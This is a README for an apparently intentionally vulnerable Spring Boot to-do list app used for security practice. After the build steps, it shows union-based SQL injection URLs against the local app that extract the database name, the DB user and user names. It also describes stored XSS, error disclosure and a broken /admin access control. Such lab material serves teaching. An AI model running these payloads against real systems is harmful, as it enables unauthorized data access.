# Non-Secure TodoList

Todo list have got existing vulnerability

## Getting Started


### How to Run

#### Build Spring Boot Project with Maven
To be able to run your Spring Boot app you will need to first build it. To build and package a Spring Boot app into a single executable Jar file with a Maven, use the below command. You will need to run it from the project folder which contains the pom.xml file.
  ```
  maven package
  ```
  or you can also use
  ```
  mvn install
  ```
  
#### Run Spring Boot app with java -jar command
To run your Spring Boot app from a command line in a Terminal window you can you the java -jar command. This is provided your Spring Boot app was packaged as an executable jar file.  

 ```
 java -jar target/todolist-0.0.1-SNAPSHOT.jar
 ```

#### Run Spring Boot app using Maven
You can also use Maven plugin to run your Spring Boot app. Use the below example to run your Spring Boot app with Maven plugin
  
  ```
  mvn spring-boot:run
  ```


## Running the tests

- Project will start on 8080 port and you can access localhost:8080
- You must register for add post

### SQL INJECTION

- After adding article , go to article detail page for sql injection (lhttp://localhost/post/1)
- Some sql injection script ()

```
  http://localhost:8080/post/1 order by 6--
```

Now we will use Union select statement over here.

```
  http://localhost:8080/post/-1 order by 6--
```

Here a small understanding of the web application is required, If you see any of these numbers printed in the webpage or the title or anywhere else then you can know the the developer is printing multiple rows

| Variable/Function  | Output |
| ------------- | ------------- |
| @@hostname  | Current Hostname  |
| @@tmpdir  | Tept Directory  |
| @@datadir  | Data Directory  |
| @@version  | Version of DB  |
| @@basedir  | Base Directory  |
| user()  | Current User  |
| database()  | Current Database  |
| version()  | Version  |
| schema()  | current Database  |
| UUID()  | System UUID key  |
| current_user()  | Current User  |
| system_user()  | Current System User  |
| session_user  | Current Session User  |
| @@GLOBAL.have_symlink  | Check if Symlink Enabled or Disabled  |
| @@GLOBAL.have_ssl  | Check if it have ssl or not  |


As we know that third is the column which is getting printed so now we will use the above functions on place of that columns only.

```
To get the Current Database Name
http://localhost:8080/post/-1 union select 1,2,database(),4,5,6--
```

```
To get the Current User
http://localhost:8080/post/-1 union select 1,2,user(),4,5,6--
```

Query : Select column1 from tablename

```
http://localhost:8080/post/-1 union Select 1,2,concat(USER_NAME),4,5,6 from User limit 0,1--

```

This allows access to other user information.

### Cross Site Scripting (XSS)

### Stored/Persistent XSS
 Where the malicious string originates from the website's database.
 
 -You can add scripting code into post title input then you execute this code.
 
## FINAL PROJECT UPDATE
 
### Security Misconfiguration

You can enter post detail page and put quotes after the url and site shows you vulnerability on screen

### Broken Access Control

if you create new user ,you can try to access /admin page and you see this user access this url becouse of there is no 'OPA' control 




